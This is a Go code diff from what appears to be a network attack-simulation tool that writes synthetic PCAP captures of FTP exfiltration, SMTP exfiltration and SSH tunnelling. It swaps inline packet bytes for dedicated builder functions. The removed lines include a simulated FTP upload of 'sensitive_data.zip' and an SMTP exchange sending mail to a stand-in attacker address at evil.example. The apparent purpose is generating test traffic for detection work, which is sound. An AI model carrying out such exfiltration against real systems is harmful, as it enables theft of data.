@@ -1096,9 +1096,7 @@ func runFTPExfil(req AttackRequest) (*AttackResult, error) {
 	result.FlowCount += fc
 	result.EventIDs = append(result.EventIDs, fids...)
 
-	ftpPayload := []byte("STOR sensitive_data.zip\r\n")
-	ftpResp := []byte("150 Opening BINARY mode data connection.\r\n226 Transfer complete.\r\n")
-	ftpPath, ftpErr := PCAPGenericTCPExchange(req.RunID, "ftp_exfil", req.AttackerIP, c2IP, 21, ftpPayload, ftpResp)
+	ftpPath, ftpErr := PCAPFTPExfil(req.RunID, req.AttackerIP, c2IP, dataMB)
 	if ftpErr == nil {
 		result.PCAPFiles = append(result.PCAPFiles, ftpPath)
 	}
@@ -1133,9 +1131,7 @@ func runSMTPExfil(req AttackRequest) (*AttackResult, error) {
 		result.FlowCount += fc
 		result.EventIDs = append(result.EventIDs, fids...)
 
-		smtpPayload := []byte(fmt.Sprintf("MAIL FROM:<%s>\r\nRCPT TO:<attacker@evil.example>\r\nDATA\r\n", req.AttackerIP))
-		smtpResp := []byte("250 OK\r\n250 OK\r\n354 Start mail input; end with <CRLF>.<CRLF>\r\n")
-		smtpPath, smtpErr := PCAPGenericTCPExchange(req.RunID, "smtp_exfil", req.AttackerIP, targetIP, 25, smtpPayload, smtpResp)
+		smtpPath, smtpErr := PCAPSMTPExfil(req.RunID, req.AttackerIP, targetIP, dataMB)
 		if smtpErr == nil {
 			result.PCAPFiles = append(result.PCAPFiles, smtpPath)
 		}
@@ -1212,9 +1208,7 @@ func runSSHTunnel(req AttackRequest) (*AttackResult, error) {
 		result.FlowCount += fc
 		result.EventIDs = append(result.EventIDs, fids...)
 
-		sshPayload := []byte("SSH-2.0-OpenSSH_8.9\r\n")
-		sshResp := []byte("SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\n")
-		sshPath, sshErr := PCAPGenericTCPExchange(req.RunID, "ssh_tunnel", req.AttackerIP, targetIP, 22, sshPayload, sshResp)
+		sshPath, sshErr := PCAPSSHTunnel(req.RunID, req.AttackerIP, targetIP, localPort, remotePort)
 		if sshErr == nil {
 			result.PCAPFiles = append(result.PCAPFiles, sshPath)
 		}
